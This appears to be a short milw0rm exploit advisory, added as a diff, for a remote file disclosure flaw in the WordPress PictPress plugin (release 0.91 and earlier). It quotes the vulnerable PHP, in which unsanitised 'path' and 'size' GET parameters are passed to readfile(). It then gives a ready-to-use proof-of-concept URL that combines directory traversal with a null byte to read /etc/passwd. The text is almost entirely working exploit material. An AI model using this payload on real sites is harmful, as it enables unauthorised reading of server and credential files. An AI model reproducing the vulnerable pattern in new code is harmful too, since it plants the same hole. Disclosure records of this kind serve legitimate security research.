@@ -1,0 +1,14 @@
+Wordpress Plugin PictPress <= release0.91 Remote File Disclosure Vulnerability
+D.Script : http://downloads.wordpress.org/plugin/pictpress.release-0.91.zip
+Vuln Code :
+In Line 5,6,7,8 :
+    $path = $_GET['path'];
+    $size = $_GET['size'];
+    $base = dirname(__FILE__) . "/..";
+    $cache = "$base/cache/$size/$path";
+In Line 22 :
+    readfile($cache);
+POC :
+    /wp-content/plugins/pictpress/resize.php?size=../../../../../../../../../../&path=/etc/passwd%00
+
+# milw0rm.com [2007-12-05]
